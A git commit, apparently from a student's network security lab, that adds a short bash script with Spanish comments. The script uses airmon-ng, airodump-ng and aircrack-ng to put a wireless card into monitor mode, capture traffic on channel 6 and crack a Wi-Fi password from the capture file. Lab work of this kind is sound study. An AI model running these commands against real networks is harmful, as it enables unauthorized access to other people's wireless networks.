f7f59837c6f03a3619f6c42768434012620bd6d9
sofiaignaciab <sofi.belmar9@gmail.com>
2024-05-17 16:50:00 -0400

    feat: add part1

---
+++ Lab3/cmd/part1.bash
@@ -0,0 +1,17 @@
+#Primero se debe inizializar el monitor?
+sudo airmon-ng
+
+#se obtiene la red, y se usa
+sudo airmon-ng start wlp4s0f4u2mon
+
+#luego se sigue con
+sudo airodump-ng wlp4s0f4u2mon
+
+#Una vez que se ve el canal de interes, se llena con eso
+sudo airodump-ng -c 6 wlp4s0f4u2mon
+
+#despues se realiza la captura
+sudo airodump-ng -c 6 -w capture wlp4s0f4u2mon
+
+#luego se ven las capturas, y se crackea la contraseña
+aircrack-ng capture-04.cap
